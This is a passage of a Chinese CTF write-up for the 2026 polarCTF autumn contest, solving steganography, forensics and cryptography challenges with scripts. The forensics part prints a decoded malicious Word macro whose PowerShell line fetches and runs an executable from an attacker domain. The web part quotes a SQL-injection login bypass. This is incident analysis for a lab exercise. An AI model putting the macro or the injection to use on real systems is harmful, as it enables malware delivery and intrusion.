---
title: 【先知】2026 polarCTF 秋季赛 writeup
source: https://xz.aliyun.com/news/92784
source_host: xz.aliyun.com
clip_date: 2026-09-11T13:36:25+08:00
trace_id: c33b117c-2669-4205-8723-a1cc24c6959e
content_hash: ff491b202999819f9fc4cb1061b1cca522a22c945fc2ee9380ca1be8d55fd17c
status: synced
tags:
  - 先知
  - CTF
  - Android逆向
series: null
feed_source: 先知安全技术社区
ai_summary: 2026 polarCTF 秋季赛多方向题解汇总，覆盖 MISC 隐写、Crypto 数学攻击、Web 逻辑/反序列化漏洞、Pwn 栈利用与 IoT/Android 逆向，逐题给出可复现脚本与最终 flag。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3d875244-d011-8165-b051-e6357e7a659e
ioc:
  cves: []
  cwes: []
  hashes:
    - "00000000010000000000000000000147"
    - 06555a53b8b6e75a5bd6b78d440cac38
    - 0f50260006a83e2f8f8b0571e2a2176a11f0318bc0e13f076868563f7e473520
    - 1cbb3b88acb636433aa7b402b9096481
    - 25ce7bcc2f1ca7501800c86b77de214c
    - 2735e64f4b28741b4cec6641c531f31a39b01f9633e951f0323cd70085342f8e
    - 37083fb4f493fe2def8c161c012e8b70
    - 4ce16de763bfbc99af1e203273f1a6b5
    - 60ea82a51c6b240c34b419d0d5be92d6
    - 666c43363d19cfbe8b5a7a2d0f0fedc9
    - 738d13e76707424bf9857eeba0f2baf5
    - 91d33ff99f483979917c364c73af228a
    - 99265a1e6c26f4663114a0ae9880474a20ea5a216c77b0c0ffe4fadc61549f68
    - 9f5d6c03bd89fa8262a2872234e84800
    - a7ee7292767092b8f5c407211df0cc2e9fef081985c5872a888c39ecbc4db407
    - ba1396277d8356364978fb032de5fd035bcfacbdf1a4cccad9cbe48b7499eb05
    - c77f5eb4d7d525855522d7ac65c5487d
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 2026 polarCTF 秋季赛多方向题解汇总，覆盖 MISC 隐写、Crypto 数学攻击、Web 逻辑/反序列化漏洞、Pwn 栈利用与 IoT/Android 逆向，逐题给出可复现脚本与最终 flag。
> 
> - **MISC 隐写：** Docker whiteout 条目（`.wh.` 前缀）的内容本身携带数据，两个 whiteout 文件拼出 `flag{layer_cake}`；零宽字符 `U+200B/200C` 映射 0/1 按 8 位解 ASCII 得 `flag{hidden}`。
> - **终端与 PNG 处理：** `terminal.bin` 先放的 flag 是假的，需按 24×80 模拟 `ESC[2J`/光标定位/`ESC7`/`ESC8` 等序列，EOF 后第 11 行残留真 flag；Tupper 公式题把 `IEND` 后附加的十六进制转整数，按 `(k>>(17x+y))&1` 还原出 `TUPPER`。
> - **Crypto 攻击：** Hill 密码矩阵求逆；LCG 用差分恒等式 `d[i+2]d[i]-d[i+1]²` 的 GCD 恢复模数、再回推 a/b/seed；RSA 广播攻击用互素指数贝祖系数合成并枚举损坏的 16 位；小指数则直接整数开立方；`state=((state^b)*x) mod 2^128` 用 Z3 求解 6 字节输入。
> - **Web 漏洞：** PHP 反序列化改 public 属性 `role=admin` 触发 `__destruct`；`home.php%23...` 利用 `#` 截断绕过白名单 include；正则校验发生在 `urldecode` 之前，故用 `ad%6din` 绕过；游戏类接口分数/步数/奖励仅在客户端维护，直接伪造 POST 即得 flag。
> - **Pwn 与 IoT/逆向：** 32 位 ret2dlresolve 需额外修补 versym 槽位；64 位 `%p` 泄露 canary+PIE 后 ROP 调 open/read/write；Shiro 1.7.1 需用 AES-GCM 而非 CBC 封装 CC4 payload；RTSP 公开流 OSD 泄露凭据后可抓维护流；APK 逐字节 XOR `0x5A` 或 AES-CBC/PKCS7 解出真 DEX，MIPS CGI 栈溢出偏移 `0x84` 换返回地址。

## MISC

### 白洞

题目描述

附件是一个无扩展名的 ZIP 文件，内含 `hint.txt` 和 `wh1tehole.tar.gz` 。提示内容为：

```latex
Black holes hide matter, but whiteouts hide history.
```

目标是从镜像层历史中恢复被删除文件留下的信息。

分析过程

将 `wh1tehole.tar.gz` 解开后可见它不是普通文件归档，而是一个 OCI image layout。 `index.json` 指向镜像清单，清单列出四个按顺序叠加的 gzip tar 层：一个 Alpine 基础层、一个写入 `root/treasure.txt` 的层，以及两个包含 Docker whiteout 文件的层。

基础层中的 `root/treasure.txt` 内容是：

```latex
This is not the flag. Keep digging.
```

第二个相关层包含 `root/.wh.treasure.txt` ，其内容为 `flag{lay` ；最后一层包含 `root/.wh.hint.txt` ，其内容为 `er_cake}` 。`.wh.` 前缀是 Docker/OCI 用于表示删除历史文件的 whiteout 条目，因此需要读取这些条目的内容，而不是把它们当作普通的最终文件。

下面的脚本直接读取 OCI 清单，逐层列出所有 whiteout 文件并打印内容：

```python
import gzip
import json
import tarfile
from pathlib import Path

root = Path("whitehole")
manifest = json.loads((root / "blobs/sha256/0f50260006a83e2f8f8b0571e2a2176a11f0318bc0e13f076868563f7e473520").read_text())

for layer in manifest["layers"]:
    digest = layer["digest"].split(":", 1)[1]
    path = root / "blobs/sha256" / digest
    with tarfile.open(path, "r:gz") as archive:
        for entry in archive:
            if ".wh." in entry.name and entry.isfile():
                print(entry.name, archive.extractfile(entry).read().decode())
```

运行结果为：

```latex
root/.wh.treasure.txt flag{lay
root/.wh.hint.txt er_cake}
```

因此附件材料能够直接复现出的候选拼接值是 `flag{layer_cake}` 。

### letter

题目描述

附件为 `letter.zip` ，解压后仅包含 `letter.txt` 。信件正文提到“信息隐藏”，并说明想说的话藏在“字里行间”，需要从文本中恢复 flag。

分析过程

以 UTF-8 读取 `letter.txt` 后，正文末尾、署名之后存在一段不可见字符。统计该段字符可知，它只由两种 Unicode 零宽字符组成： `U+200B` （零宽空格）和 `U+200C` （零宽非连接符）。该段长度为 96，正好能组成 12 个字节，因此可将两种字符分别映射为二进制 `0` 和 `1` ，再按每 8 位转为 ASCII。

下面脚本提取所有这两类字符，将 `U+200B` 映射为 `0` 、 `U+200C` 映射为 `1` ，并输出解码结果：

```python
from pathlib import Path

text = Path("letter.txt").read_text(encoding="utf-8")
hidden = "".join(ch for ch in text if ch in {"\u200b", "\u200c"})
bits = "".join("0" if ch == "\u200b" else "1" for ch in hidden)

assert len(bits) % 8 == 0
plain = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits), 8))
print(plain.decode("ascii"))
```

运行输出：

```latex
flag{hidden}
```

因此本题最终 flag 为 `flag{hidden}` 。

### 我的光标去哪了

题目描述

附件压缩包中的 `player/terminal.bin` 是一段终端输出记录； `README.md` 提示“我打印了它，EOF 时还剩下什么”。目标是恢复终端处理完全部字节后的屏幕状态。

分析过程

直接按文本查看 `terminal.bin` 会看到两个看似完整的 flag，例如 `flag{grep_is_not_rendering}` 与 `flag{close_but_transient}` ，但二者都出现在后续的 ANSI 控制序列之前，不能作为最终结果。文件中随后出现 `ESC[2J` （清屏）、 `ESC[row;columnH` （移动光标）、 `ESC[2K` （从当前位置清至行尾）、 `ESC7` / `ESC8` （保存/恢复光标位置）以及退格、回车、制表符等控制字符。

因此按 24 行、80 列终端模拟这些控制序列。文件先用 `ESC[2J` 清除前面的日志和伪 flag，再在边框内写入点位；部分字符先移动到其他坐标写入，随后恢复光标继续写入。处理至 EOF 后，第 11 行的残留内容为：

```latex
|                     flag{cursor_moves_but_truth_stays}                     |
```

复现脚本

将原始附件中的 `terminal.bin` 与下列代码保存为同一目录的 `recover.py` 后运行：

```powershell
python recover.py
```

脚本维护 24×80 字符缓冲区，解析题目实际使用的 CSI 光标定位、相对移动与擦除控制序列，同时处理 `ESC7` / `ESC8` 和基础控制字符：

```python
from pathlib import Path

data = Path("terminal.bin").read_bytes()
rows, columns = 24, 80
screen = [[" "] * columns for _ in range(rows)]
row = column = 0
saved = None
index = 0

while index < len(data):
    byte = data[index]
    if byte == 0x1B and index + 1 < len(data):
        if data[index + 1] in (ord("7"), ord("8")):
            if data[index + 1] == ord("7"):
                saved = (row, column)
            elif saved is not None:
                row, column = saved
            index += 2
            continue
        if data[index + 1] == ord("["):
            end = index + 2
            while end < len(data) and not (0x40 <= data[end] <= 0x7E):
                end += 1
            if end == len(data):
                break
            raw = data[index + 2:end].decode("ascii", "ignore").replace("?", "")
            values = [int(x) if x else 0 for x in raw.split(";")] if raw else []
            command = chr(data[end])
            amount = values[0] if values and values[0] else 1
            if command in "Hf":
                row = (values[0] if values and values[0] else 1) - 1
                column = (values[1] if len(values) > 1 and values[1] else 1) - 1
            elif command == "J" and values and values[0] == 2:
                screen = [[" "] * columns for _ in range(rows)]
            elif command == "K":
                for pos in range(column, columns):
                    screen[row][pos] = " "
            elif command == "A":
                row = max(0, row - amount)
            elif command == "B":
                row = min(rows - 1, row + amount)
            elif command == "C":
                column = min(columns - 1, column + amount)
            elif command == "D":
                column = max(0, column - amount)
            index = end + 1
            continue
    if byte == 10:
        row = min(rows - 1, row + 1)
    elif byte == 13:
        column = 0
    elif byte == 8:
        column = max(0, column - 1)
    elif byte == 9:
        column = min(columns - 1, (column // 8 + 1) * 8)
    elif byte >= 32:
        if row < rows and column < columns:
            screen[row][column] = chr(byte)
        column += 1
    index += 1

print("\n".join("".join(line).rstrip() for line in screen))
```

运行输出中可得到：

```latex
flag{cursor_moves_but_truth_stays}
```

因此本题最终 flag 为 `flag{cursor_moves_but_truth_stays}` 。

### 自画像

题目描述

附件是一个压缩包，解压后包含 `README.md` 和 `self_portrait.png` 。题目说明数学家留下的“自画像”会使用自己的 Tupper 公式，并提示要从图片中读出他想说的话。

分析过程

读取 PNG 后发现，图像的 400×300 个像素全部是同一种颜色，正常显示不会得到文字。继续检查 PNG 文件结构，在标准 `IEND` 数据块之后还存在一段 ASCII 十六进制字符串。这不是 PNG 像素数据，而是题目额外附加的编码内容。

将 `IEND` 后的字符串转换为整数，并按 Tupper 图形使用的 17 位列布局读取：对每个横坐标 `x` ，第 `y` 位由

```latex
(k >> (17*x + y)) & 1
```

决定。遍历完整网格后，非空区域位于约 `x=35..69` 、 `y=5..16` ；把该区域放大后可以读出提示词 `TUPPER` 。这一步得到的是题目提示词本身，而不是最终提交字符串。

复现提取和还原过程的脚本如下：

```python
from pathlib import Path

png = Path("self_portrait.png").read_bytes()
tail = png[png.index(b"IEND") + 12:].strip()
k = int(tail, 16)

for y in range(5, 17):
    row = ""
    for x in range(35, 70):
        row += "##" if ((k >> (17 * x + y)) & 1) else "  "
    print(row.rstrip())
```

输出的放大字符对应 `TUPPER` 。结合平台要求的外层格式 `flag{}` ，并按提交结果确认花括号内使用小写，最终 flag 为：

```latex
flag{tupper}
```

### CyberPunk

题目描述

附件为一个无扩展名的 ZIP 文件，解压后得到 `Ly.png` 、 `IReallyWant.mp3` 和加密的 `End.zip` 。目标是从图片、音频及压缩包内的隐藏信息中恢复最终 flag。

分析过程

首先检查 `Ly.png` 的像素最低位。将 RGB 三个通道的 LSB 依次串联后按字节读取，开头得到字符串 `HERSECRET` ，说明图片提供了音频元数据的解密密钥。

`IReallyWant.mp3` 的 ID3v2.4 `TXXX` （comment）字段内容为：

```latex
KemahuKigkiiVixfxxkHvhipueusiRfhRlvx
```

使用 `HERSECRET` 作为 Vigenère 密钥解密，得到：

```latex
DavidsTenderDevotedDependableAndPure
```

这是 `End.zip` 的 WinZip AES 密码。压缩包的压缩方法为 99，使用 `pyzipper` 设置该密码后可以成功读取 `Moon.txt` 。需要注意，大小写必须保持为上面解出的 CamelCase 形式；全小写字符串只能通过部分目录检查，不能完成实际解密。

`Moon.txt` 的可见文本提示 `iamonthemoon` 的 MD5，这一结果是干扰项。文件中还嵌有零宽字符： `U+200B` 用作分隔符，其余字符 `U+200C` 、 `U+200D` 、 `U+200E` 、 `U+200F` 和 `U+FEFF` 分别组成五进制数字。按每组三个数字解码，使用映射

```latex
U+200E -> 0    U+200F -> 1    U+200C -> 2
U+200D -> 3    U+FEFF -> 4
```

其中前 25 组均为三位五进制数，解出 `flag{butyouarenotbesideme` ；最后一组为四位数 `1000` （五进制），对应十进制 `125` 、即 ASCII 字符 `}` 。因此完整结果为：

```latex
flag{butyouarenotbesideme}
```

这与题目音频名称所对应歌曲的主题相呼应，也验证了可见 MD5 提示并非最终答案。

复现脚本

下面脚本演示从 `Moon.txt` 提取零宽字符并解码最终 flag；前置步骤可分别使用图片 LSB 提取、ID3 元数据读取和 Vigenère 解密完成。

```python
from pathlib import Path

text = Path("Moon.txt").read_text(encoding="utf-8")
separator = "\u200b"
digits = {
    "\u200e": 0,
    "\u200f": 1,
    "\u200c": 2,
    "\u200d": 3,
    "\ufeff": 4,
}

# 只保留零宽编码字符，并按 U+200B 分组
hidden = "".join(ch for ch in text if ch == separator or ch in digits)
groups = [group for group in hidden.split(separator) if group]
assert len(groups) == 26
assert all(len(group) == 3 for group in groups[:25])
assert len(groups[25]) == 4

plain = "".join(
    chr(digits[group[0]] * 25 + digits[group[1]] * 5 + digits[group[2]])
    for group in groups[:25]
)
plain += chr(sum(digits[ch] * 5 ** (3 - index)
                 for index, ch in enumerate(groups[25])))
print(plain)
```

运行输出为：

```latex
flag{butyouarenotbesideme}
```

因此本题最终 flag 为 `flag{butyouarenotbesideme}` 。

### 星辰科技

题目描述

2026 年 3 月 14 日凌晨，蓝盾支付（BlueShield Pay，虚构公司）核心数据库遭到勒索加密。附件 `deploy.zip` 中提供了钓鱼邮件、恶意 Word 宏文档、网络抓包、域控事件日志和勒索信，需要还原攻击链并判断攻击组织。

1\. 恶意文档哈希

从压缩包解出 `soc-platform/backend/evidence/2026-Q1_Salary_Review.docm` ，计算 SHA-256：

```powershell
Get-FileHash -Algorithm SHA256 .\2026-Q1_Salary_Review.docm
```

关键输出：

```latex
99265A1E6C26F4663114A0AE9880474A20EA5A216C77B0C0FFE4FADC61549F68
```

因此 Q1 要求的前 16 位为：

```latex
99265a1e6c26f466
```

2\. 还原 VBA 宏中的下载 URL

DOCM 是 ZIP 容器，宏代码位于 `word/vbaProject.bin` 。使用 `olevba` 或直接查看该 OLE 流，可以看到：

```vbnet
Sub AutoOpen()
    Dim enc As String
    enc = "U0xURlFQS0ZPTwMOTUxTAw5UA0tKR0dGTQMOQAMBRkBLTAN4CX4D..."
    Dim ps As String
    ps = DecodeXor(enc)
    Shell ps, vbHide
End Sub
```

宏注释给出了编码顺序：先 Base64 解码，再将每个字节与 `0x23` 异或。完整复现脚本如下：

```python
import base64

enc = "U0xURlFQS0ZPTwMOTUxTAw5UA0tKR0dGTQMOQAMBRkBLTAN4CX4DZFFGWm9aTVsDVlNHQldGA0FMTFdQV1FCUxgDSlRRA0tXV1MZDAxAR00NRFFGWk9KTVsOQExNUFZPV0pNRA1bWlkZGxMbEwxWU0dCV0YMUFVADUZbRgMObFZXZUpPRgMHRk1VGXdmbnN/UFVADUZbRhgDUFdCUVcDB0ZNVRl3Zm5zf1BVQA1GW0YB"
raw = bytearray(base64.b64decode(enc))
decoded = bytes(b ^ 0x23 for b in raw)
print(decoded.decode("ascii"))
```

实际完整输出为：

```latex
powershell -nop -w hidden -c "echo [*] GreyLynx update bootstrap; iwr http://cdn.greylinx-consulting.xyz:8080/update/svc.exe -OutFile $env:TEMP\svc.exe; start $env:TEMP\svc.exe"
```

所以 Q2 的提交格式为宏中下载 payload 的完整 URL（不带 `http://` ）：

```latex
cdn.greylinx-consulting.xyz:8080/update/svc.exe
```

3\. C2 地址

用 Wireshark `tshark` 查看 `capture.pcap` 的 HTTP 字段：

```powershell
tshark -r .\capture.pcap -Y http -T fields `
  -e ip.dst -e tcp.dstport -e http.host -e http.request.uri
```

抓包中重复出现：

```latex
203.0.113.45   8443   c2.greylinx-consulting.xyz:8443   /gate.php
```

因此 Q3 为：

```latex
203.0.113.45:8443
```

同一抓包还记录了下载服务器 `203.0.113.46:8080` 的 `/update/svc.exe` 请求；该地址是 payload 下载站，不是 beacon C2。

4\. 组织归属与攻击链

-   `phishing.eml` 的发件人、回信地址和中继域均为 `greylinx-consulting.xyz` 。
-   `README.txt` 标记勒索家族为 `GreyLock` ，并留下受害者 ID `GL-2026-0314-BLUE` 。
-   域控日志显示来自 `198.51.100.7` 的多次 `administrator` 登录失败，随后该地址以 `dvadmin` 通过 LogonType 10 登录域控。
-   EventID 4688 创建 PowerShell 进程，命令为 Base64 编码的 `iwr http://c2.greylinx-consulting.xyz:8443/gate.php` ；EventID 4698 创建 `GreyLynxUpdate` 计划任务，持续回连；EventID 1102 清除 Security 日志。
-   `data/intel.json` 将钓鱼域、邮箱、下载服务器、C2、RDP 来源、样本哈希和 GreyLock 全部关联到 `GreyLynx` 。

综合邮件、宏、网络、域控日志和勒索信，归属组织为：

```latex
GreyLynx（勒索软件家族：GreyLock）
```

最终答案

```latex
Q1: 99265a1e6c26f466
Q2: cdn.greylinx-consulting.xyz:8080/update/svc.exe
Q3: 203.0.113.45:8443
Q4: GreyLynx（GreyLock）
```

### deploy

题目描述

题目给出站点 `http://111.229.26.3:8000/` ，要求从站点留下的入侵痕迹中依次确定攻击者代号、攻击日期、被泄露的数据文件、所利用的漏洞类型，以及藏在深层目录中的 flag。提交端对前三项给出了格式提示，其中攻击者代号格式为 `xxx_xxx` ，日期格式为 `YYYY-MM-DD` ，第三项提示为 `XXX:XXX` 。

分析过程

首页 HTML 的末尾注释直接保留了攻击者标识：

```html
<!-- 本站已被入侵，入侵者代号：H4ck3r_Shadow -->
```

同一标识还出现在首页响应头 `X-Attacker: H4ck3r_Shadow` 中，因此第一项为 `H4ck3r_Shadow` 。

首页导航中的“后台管理”指向 `/admin_panel` 。该页面的安全警告说明系统于 `2026-08-15` 遭入侵，并明确指出原登录接口存在 SQL 注入漏洞；页面注释还记录了攻击者使用的请求：

```latex
攻击者利用 login.php?id=1 OR 1=1 的 SQL 注入绕过登录
```

这两处独立证据分别确定第二项日期为 `2026-08-15` ，第四项为 `SQL注入` 。

站点的 `robots.txt` 声明了 `/backup` 与 `/internal` 两个未在首页导航中公开的目录。访问 `/backup` 后，目录列表显示 `customer_data.csv` 被外部 IP 下载；下载文件内容的首行是：

```latex
id,name,phone,id_card,address
```

`/internal/access.log` 给出了与页面时间线相对应的访问记录：

```latex
[2026-08-15 03:26:18] 203.0.113.66  GET /admin_panel/login.php?id=1 OR 1=1   (SQL注入探测)
[2026-08-15 03:27:02] 203.0.113.66  GET /backup/customer_data.csv             (敏感数据下载)
[2026-08-15 03:28:40] 203.0.113.66  POST /admin_panel/upload.php             (上传后门)
[2026-08-15 03:30:11] 203.0.113.66  GET /index.html                            (篡改首页)
```

由日志中的下载路径及备份目录文件名可确定泄露文件是 `customer_data.csv` 。尽管题面给出 `XXX:XXX` 的格式提示，实际提交验证通过的第三项是完整文件名 `customer_data.csv` 。

最后， `/internal` 的目录页列出 `flag.txt` 。直接读取 `/internal/flag.txt` 返回：

```latex
flag{Live_Web_Forensics}
```

复现命令

以下 PowerShell 命令依次获取三个关键证据页面和最终 flag：

```powershell
$base = 'http://111.229.26.3:8000'
(Invoke-WebRequest -UseBasicParsing "$base/").Headers['X-Attacker']
(Invoke-WebRequest -UseBasicParsing "$base/admin_panel").Content
(Invoke-WebRequest -UseBasicParsing "$base/backup/customer_data.csv").Content
(Invoke-WebRequest -UseBasicParsing "$base/internal/access.log").Content
(Invoke-WebRequest -UseBasicParsing "$base/internal/flag.txt").Content
```

关键输出依次包含 `H4ck3r_Shadow` 、 `2026-08-15` 、 `customer_data.csv` 、 `SQL 注入` 和 `flag{Live_Web_Forensics}` ，与上述证据链一致。

五项最终答案为：

```latex
H4ck3r_Shadow
2026-08-15
customer_data.csv
SQL注入
flag{Live_Web_Forensics}
```

## CRYPTO

### hiller

题目描述

附件是一个 RAR 文件，解压后得到题目文本。文本给出密钥矩阵$K=\\begin{pmatrix}1&2&30&1&23&1&2\\end{pmatrix}$以及密文 `MHZMXJNNN` ，要求恢复 flag。

分析过程

这是 Hill 密码。将 `A` 映射为 0、 `B` 映射为 1，依次把密文按 3 个字符分块，并采用列向量形式$C=KP\\pmod {26},\\qquad P=K^{-1}C\\pmod {26}.$

矩阵行列式为 `det(K)=3` ，且 `3` 在模 26 下的逆元为 `9` ，因此$K^{-1}\\equiv\\begin{pmatrix}0&17&92&15&825&19&9\\end{pmatrix}\\pmod {26}.$

对密文分块 `MHZ` 、 `MXJ` 、 `NNN` 解密，得到数字块 `[6,17,8]` 、 `[4,25,12]` 、 `[0,13,13]` ，对应明文 `GRI` 、 `EZM` 、 `ANN` ，合并为 `GRIEZMANN` 。

复现脚本

```python
K = [[1, 2, 3], [0, 1, 2], [3, 1, 2]]
ciphertext = "MHZMXJNNN"

def minor(a, row, col):
    return [[a[r][c] for c in range(3) if c != col]
            for r in range(3) if r != row]

def det2(a):
    return a[0][0] * a[1][1] - a[0][1] * a[1][0]

det = (K[0][0] * det2(minor(K, 0, 0))
       - K[0][1] * det2(minor(K, 0, 1))
       + K[0][2] * det2(minor(K, 0, 2)))
det_inv = pow(det % 26, -1, 26)

# 伴随矩阵 = 余子式矩阵的转置
inverse = []
for i in range(3):
    row = []
    for j in range(3):
        sign = -1 if (i + j) % 2 else 1
        row.append((det_inv * sign * det2(minor(K, j, i))) % 26)
    inverse.append(row)

numbers = [ord(ch) - ord('A') for ch in ciphertext]
plain = []
for offset in range(0, len(numbers), 3):
    block = numbers[offset:offset + 3]
    plain.extend(sum(inverse[i][j] * block[j] for j in range(3)) % 26
                 for i in range(3))

print(''.join(chr(value + ord('A')) for value in plain))
```

运行输出为：

```latex
GRIEZMANN
```

因此本题最终 flag 为 `flag{GRIEZMANN}` 。

### 基础数学

题目描述

附件中的题目文本给出如下运算：

```latex
T = M ^ key
C = T mod n
```

其中 `M` 是原始明文，要求恢复其对应的 15 字节大端可打印字符串。已知：

```latex
key = 0x00010001
n   = 0x3DBBB2B8BAB33438B33CB9B0BA3056
C   = 2000
```

分析过程

由 `C = T mod n` 可知，所有可能的 `T` 都可以写成：

$T = 2000 + k n,\\qquad k\\ge 0.$题目要求 `M` 是 15 字节，因此 `T` 也不会超过 `2^{120}-1` 。在这个范围内只需枚举 `k=0,1,2,3,4` 。对每个候选值计算$M = T \\mathbin{\\mathrm{XOR}} 0x00010001,$再按 15 字节大端解析并检查是否全部为可打印 ASCII。复现脚本如下：

```python
KEY = 0x00010001
MODULUS = 0x3DBBB2B8BAB33438B33CB9B0BA3056
CIPHER = 2000
BYTE_LEN = 15

limit = 1 << (8 * BYTE_LEN)
for k in range((limit - 1 - CIPHER) // MODULUS + 1):
    t = CIPHER + k * MODULUS
    m = t ^ KEY
    raw = m.to_bytes(BYTE_LEN, "big")
    if all(0x20 <= byte <= 0x7e for byte in raw):
        print(k, raw.decode("ascii"))
```

运行输出为：

```latex
2 {wequfhqfysauh}
```

这里 `k=2` 是唯一得到 15 个可打印 ASCII 字节的候选值，因此原始明文为 `{wequfhqfysauh}` 。按题目使用的 `flag` 外层格式，最终答案为：

```latex
flag{wequfhqfysauh}
```

### LCG4.0

题目描述

附件 `4.0.py` 使用线性同余生成器（LCG）迭代 flag 对应的整数，并给出了连续 10 个输出状态。生成关系为：$s\_{i+1}=a s_i+b\\pmod m.$其中初始状态 `seed` 即 `bytes_to_long(flag)` ； `a` 、 `b` 、 `m` 均为与 flag 位长相同的素数。脚本正文没有保留打印出的 `m` ，因此需要仅从给出的状态序列恢复全部参数和初始状态。

分析过程

令相邻状态差为 $d_i=s\_{i+1}-s_i$。由 LCG 递推式相减可得：$d\_{i+1}\\equiv a d_i\\pmod m.$消去未知乘数 $a$ 后，每三个连续差分都满足：$d\_{i+2}d_i-d\_{i+1}^2\\equiv0\\pmod m.$因此 $m$ 整除所有 $|d\_{i+2}d_i-d\_{i+1}^2|$，对这些值求最大公约数即可恢复模数。本题得到：

```latex
m = 1321686059169464686504334539368898634722771
```

有了模数后，取首两个差分即可计算：$a\\equiv d_1d_0^{-1}\\pmod m,\\qquad b\\equiv s_1-a s_0\\pmod m.$恢复结果为：

```latex
a = 864627827635375530732233567562343956520897
b = 1158343860852874514750980020186868343571703
```

第一个给出的状态是初始状态迭代一次后的结果，故将递推式反解：$seed\\equiv(s_1-b)a^{-1}\\pmod m.$得到 `seed = 42008170895622552782693455202459542710141` 。将该整数按最短大端字节串转换，结果为 `b'{solvethelastlag}'` 。把题目使用的 `flag` 外层格式补上，最终答案为 `flag{solvethelastlag}` 。

复现脚本

以下脚本直接使用附件中的 10 个状态恢复参数，并回代验证每一步递推：

```python
from math import gcd

states = [
    421212310892931870090770823648461624975774,
    862129767917451191679336928145552691547367,
    1079761070727277937369386910846268488929766,
    40605969152837342975500589521586616251762,
    439006148938366452242502948541061704411062,
    954155169757201085402176495152430057621156,
    563168879613345685512623653387438510002584,
    561093487257447844384066670581505915222992,
    368958647863543275592990859614306474308863,
    197354019925819894610192413469597110533773,
]

delta = [right - left for left, right in zip(states, states[1:])]
modulus = 0
for i in range(len(delta) - 2):
    relation = delta[i + 2] * delta[i] - delta[i + 1] ** 2
    modulus = gcd(modulus, abs(relation))

multiplier = delta[1] * pow(delta[0], -1, modulus) % modulus
increment = (states[1] - multiplier * states[0]) % modulus
seed = (states[0] - increment) * pow(multiplier, -1, modulus) % modulus
plain = seed.to_bytes((seed.bit_length() + 7) // 8, "big")

print("m =", modulus)
print("a =", multiplier)
print("b =", increment)
print("seed =", seed)
print(plain)
assert all(
    (multiplier * current + increment) % modulus == following
    for current, following in zip(states, states[1:])
)
```

运行输出：

```latex
m = 1321686059169464686504334539368898634722771
a = 864627827635375530732233567562343956520897
b = 1158343860852874514750980020186868343571703
seed = 42008170895622552782693455202459542710141
b'{solvethelastlag}'
```

### 广播攻击

题目描述

题目对同一明文使用相同 RSA 模数 `n` 、两组互素公钥指数 `e1=17` 和 `e2=65537` 加密。第二组密文 `c2` 完整；第一组密文的固定 256 位表示中高 16 位被置零，给出的值为 `c1_damaged` 。目标是恢复原始明文。

本题参数为：

```latex
n  = 0xa7ee7292767092b8f5c407211df0cc2e9fef081985c5872a888c39ecbc4db407
c1_damaged = 0x6a25cb19d24d8afbc12ac5fc5250fa75b54a2e2b49f7cadc8ea0cee60217543
c2 = 0x2735e64f4b28741b4cec6641c531f31a39b01f9633e951f0323cd70085342f8e
```

分析过程

设两次加密对应的密文为：$c_1=m^{17}\\pmod n,\\qquad c_2=m^{65537}\\pmod n.$两指数互素，扩展欧几里得算法可得：$1=30841\\times17-8\\times65537.$因此只要恢复 `c1` ，就可以计算：$m=c_1^{30841}\\cdot c_2^{-8}\\pmod n.$令被清除的 16 位为 `top` ，则候选密文为：$c_1=c1damaged+(top\\ll240),\\qquad 0\\le top<2^{16}.$逐一枚举这 65536 种可能，并将恢复出的明文分别以两个指数回代验证。有效候选在 `top=0` 时出现，说明这份样本的原始 `c1` 高 16 位本来就是零。由此恢复的明文整数为：

```latex
0x666c61677b35757033725f3533637233745f6b33795f323032367d
```

转换为大端字节串后得到：

```latex
flag{5up3r_53cr3t_k3y_2026}
```

复现脚本

脚本枚举损坏部分，使用贝祖系数合成候选明文，并通过重新加密确认结果：

```python
from math import gcd

e1, e2 = 17, 65537
n = 0xa7ee7292767092b8f5c407211df0cc2e9fef081985c5872a888c39ecbc4db407
c1_damaged = 0x6a25cb19d24d8afbc12ac5fc5250fa75b54a2e2b49f7cadc8ea0cee60217543
c2 = 0x2735e64f4b28741b4cec6641c531f31a39b01f9633e951f0323cd70085342f8e

assert gcd(e1, e2) == 1
a, b = 30841, -8
assert a * e1 + b * e2 == 1

for top in range(1 << 16):
    c1 = c1_damaged | (top << 240)
    if c1 >= n:
        continue
    message = pow(c1, a, n) * pow(c2, b, n) % n
    if pow(message, e1, n) == c1 and pow(message, e2, n) == c2:
        print(f"top = {top:#06x}")
        print(message.to_bytes((message.bit_length() + 7) // 8, "big").decode())
        break
else:
    raise RuntimeError("no valid c1 candidate")
```

运行输出：

```latex
top = 0x0000
flag{5up3r_53cr3t_k3y_2026}
```

### cokecoke

题目描述

附件脚本要求输入一个十六进制整数。程序把该整数转换为大端字节串，并强制要求长度为 6 字节；随后将字节串送入自定义的 128 位状态迭代函数。只有当最终状态等于给定常量时，程序才会打印环境变量 `FLAG` 。

分析过程

状态初值、乘数和目标值分别为：

```latex
base = 0x25ce7bcc2f1ca7501800c86b77de214c
x    = 0x00000000010000000000000000000147
coke = 177830285821087443523022595911573187680
```

对输入的每个字节 `b` ，程序执行：

```python
state = ((state ^ b) * x) mod 2**128
```

输入长度只有 6 字节，即 48 个未知比特。可以将这 6 个字节建模为 8 位位向量，把循环展开后约束最终 128 位状态等于 `coke` 。使用 Z3 求解得到一组满足约束的字节：

```latex
58 b3 06 e7 19 2d
```

因此提交时应输入这些字节对应的十六进制整数 `58b306e7192d` 。该整数转换为大端字节串后长度恰为 6，满足程序的长度检查。

复现脚本

以下脚本完整重建状态迭代并求解输入；运行环境需要 `z3-solver` 和 `pycryptodome` ：

```python
from z3 import BitVec, BitVecVal, Solver, ZeroExt, sat

BASE = 0x25CE7BCC2F1CA7501800C86B77DE214C
MULT = 0x00000000010000000000000000000147
TARGET = 177830285821087443523022595911573187680

byte_vars = [BitVec(f"b{i}", 8) for i in range(6)]
state = BitVecVal(BASE, 128)
for value in byte_vars:
    state = (state ^ ZeroExt(120, value)) * BitVecVal(MULT, 128)

solver = Solver()
solver.add(state == BitVecVal(TARGET, 128))
if solver.check() != sat:
    raise RuntimeError("no 6-byte solution")

model = solver.model()
raw = bytes(model.eval(value).as_long() for value in byte_vars)
print(raw.hex())

# 独立回代，确认与题目中的目标状态一致。
check = BASE
for value in raw:
    check = ((check ^ value) * MULT) & ((1 << 128) - 1)
print(check)
```

实际输出为：

```latex
58b306e7192d
177830285821087443523022595911573187680
```

回代结果与题目给出的 `coke` 完全一致，故最终 flag 为：

```latex
flag{58b306e7192d}
```

### 告别季

题目描述

